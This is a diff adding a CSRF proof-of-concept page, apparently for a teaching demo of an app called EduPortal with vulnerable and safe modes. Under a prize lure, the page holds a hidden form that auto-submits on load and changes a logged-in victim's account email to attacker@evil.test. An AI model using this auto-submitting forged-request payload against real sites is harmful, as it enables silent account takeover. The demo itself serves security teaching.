@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Win a free laptop!</title></head>
+<body>
+  <!-- CSRF proof-of-concept attack page.
+       A victim who is logged in to EduPortal and opens this page has their
+       account email silently changed to the attacker's address.
+
+       In VULNERABLE mode (no CSRF token checked, SameSite=none) this succeeds.
+       In SAFE mode the POST is rejected: the request carries no valid token and
+       the SameSite=strict session cookie is not sent cross-site.
+
+       Served from /csrf-attack.html so it counts as a valid same-origin demo
+       per the brief; to show a true cross-site attack, open this file from a
+       different origin (e.g. a second local server / file:// ) instead. -->
+  <h1>🎉 Congratulations! Click to claim your prize…</h1>
+  <p>Loading your reward…</p>
+
+  <form id="evil" action="http://localhost:3000/account/email" method="POST">
+    <input type="hidden" name="email" value="attacker@evil.test">
+  </form>
+  <script>
+    // Auto-submit as soon as the page loads — no user interaction needed.
+    document.getElementById('evil').submit();
+  </script>
+</body>
+</html>
